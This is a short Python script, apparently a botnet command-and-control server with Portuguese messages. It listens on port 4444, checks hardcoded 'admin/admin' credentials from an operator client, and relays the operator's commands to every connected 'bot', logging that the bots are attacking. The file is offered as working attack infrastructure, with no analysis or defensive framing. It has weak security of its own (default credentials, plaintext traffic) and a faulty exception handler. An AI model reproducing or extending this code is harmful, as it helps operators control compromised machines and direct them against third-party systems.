from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread

clients = {}
addresses = {}

HOST = '127.0.0.1'
PORT = 4444
BUFSIZ = 1024
ADDR = (HOST, PORT)

user_required = 'admin'
pass_required = 'admin'

SERVER = socket(AF_INET, SOCK_STREAM)
SERVER.bind(ADDR)

def accept_incoming_connections():
    while True:
        client, client_address = SERVER.accept()
        print("%s:%s has connected." % client_address)
        addresses[client] = client_address
        Thread(target=handle_client, args=(client,)).start()

def handle_client(client):

    name = client.recv(BUFSIZ).decode("utf8")
    clients[client] = name

    while True:
        try:
            data = client.recv(BUFSIZ)
            data = str(data)
            data = data.replace('b','',1)
            data = data.replace("'",'',2)
            data = data.split(':')
            message = data[1]
            credentials = data[0]
            credentials = credentials.split('-')
            user = credentials[0]
            password = credentials[1]
            if user == user_required and password == pass_required:
                if message == "!bots":
                    client.send(bytes("{} bots ativos!".format(len(clients)-1), "utf8"))
                else:
                    print("Comando recebido! Enviando aos bots!\n")
                    broadcast(message)
        except socket.error:
            del clients[client]
            client.close()

def broadcast(msg):  
    count_clients = 0
    for sock in clients:
        if clients[sock] == "admin":
            continue
        count_clients += 1
        print(f"{count_clients} bots atacando!")
        sock.send(bytes(msg,"utf8"))

if __name__ == "__main__":
    SERVER.listen()
    print(f"Listening on {HOST}:{PORT}...")
    ACCEPT_THREAD = Thread(target=accept_incoming_connections)
    ACCEPT_THREAD.start()
    ACCEPT_THREAD.join()
    SERVER.close()